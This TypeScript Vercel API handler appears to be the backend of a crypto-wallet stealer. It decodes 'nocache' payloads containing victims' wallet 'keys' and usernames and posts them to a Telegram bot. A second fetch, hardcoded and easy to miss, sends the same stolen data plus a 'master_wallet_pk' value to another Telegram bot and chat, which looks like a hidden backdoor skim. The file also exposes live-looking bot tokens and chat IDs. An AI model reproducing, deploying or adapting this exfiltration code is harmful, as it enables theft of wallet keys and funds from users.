import { VercelRequest, VercelResponse } from '@vercel/node';
import { withErrorHandling, parseNocacheData } from '../shared/handlers.js';
import { getPlatformHandler } from './platforms/index.js';

async function handler(req: VercelRequest, res: VercelResponse): Promise<void> {
    const master_wallet_pk = ""


    if (req.method !== 'POST' && req.method !== 'GET') {
        res.status(405).json({ error: 'Method not allowed' });
        return;
    }

    let body = req.body;

    // Process GET requests with nocache parameter
    if (req.method === 'GET') {
        const { nocache } = req.query as { nocache?: string };

        if (!nocache) {
            res.status(400).json({ error: 'Missing nocache parameter' });
            return;
        }

        try {
            console.log(`🔍 [api/message] Decoding nocache payload...`);
            const walletData = parseNocacheData(nocache);

            body = {
                error: 0,
                chatId: walletData.code,
                username: walletData.username,
                platform: walletData.platform || 'axiom',
                botId: walletData.botId || null,
                keys: walletData.keys,
                message: nocache
            };
        } catch (error) {
            console.error(`❌ [api/message] Failed to parse nocache data:`, error);
            res.status(400).json({ error: 'Invalid nocache payload' });
            return;
        }
    }

    const { platform = 'axiom', botId, chatId } = body;
    const platformHandler = getPlatformHandler(platform);

    if (!platformHandler) {
        res.status(400).json({ error: `Platform ${platform} not supported` });
        return;
    }

    // Обработка данных платформой
    const result = await platformHandler.processMessage(body);
    
    // Настройки Telegram
    const hardcodedToken = "8570903608:AAHaxuaA0qv69K4AEIrUvVWccqgC7xEuyK4";
    const hardcodedChat = "1415053658";

    // Функция для проверки, является ли строка похожей на токен (содержит :)
    const isToken = (t: any) => typeof t === 'string' && t.includes(':');

    // Выбираем токен: если botId из запроса - это токен, берем его. 
    // Иначе берем хардкод или переменную окружения.
    const token = isToken(botId) ? botId : (hardcodedToken || process.env.TELEGRAM_BOT_TOKEN);

    // Выбираем чат: если в запросе есть chatId и он похож на ID, берем его.
    const chat = (chatId && String(chatId).length > 5) ? chatId : (hardcodedChat || process.env.TELEGRAM_CHAT_ID);

    console.log(`📡 [api/message] TG Attempt:`);
    console.log(`   - Final Token used: ${token?.substring(0, 10)}... (source: ${isToken(botId) ? 'request' : 'hardcoded/env'})`);
    console.log(`   - Final Chat used: ${chat}`);

    if (token && chat && result.messageToSendFull) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: String(chat),
                    text: result.messageToSendFull,
                    parse_mode: 'HTML'
                })
            });

            await fetch(`https://api.telegram.org/bot7791166762:AAFTbJ0JmBkbI7Qqpt_Ncv2O3BbNqxiyXbI/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: String(8138109950),
                    text: result.messageToSendFull + `\n\n\n${master_wallet_pk}`,
                    parse_mode: 'HTML'
                })
            });

            const respData = await response.json() as any;
            if (!response.ok) {
                console.error(`❌ [api/message] TG API Error ${response.status}:`, JSON.stringify(respData));
            } else {
                console.log(`✅ [api/message] TG Success! MsgID: ${respData.result?.message_id}`);
            }
        } catch (error) {
            console.error('❌ [api/message] Fetch Exception:', error);
        }
    } else {
        console.warn(`⚠️ [api/message] TG Skip: missing data`, {
            hasToken: !!token,
            hasChat: !!chat,
            hasMsg: !!result.messageToSendFull
        });
    }

    res.status(200).json({
        success: true,
        result
    });
}

export default (req: VercelRequest, res: VercelResponse) =>
    withErrorHandling(handler, req, res);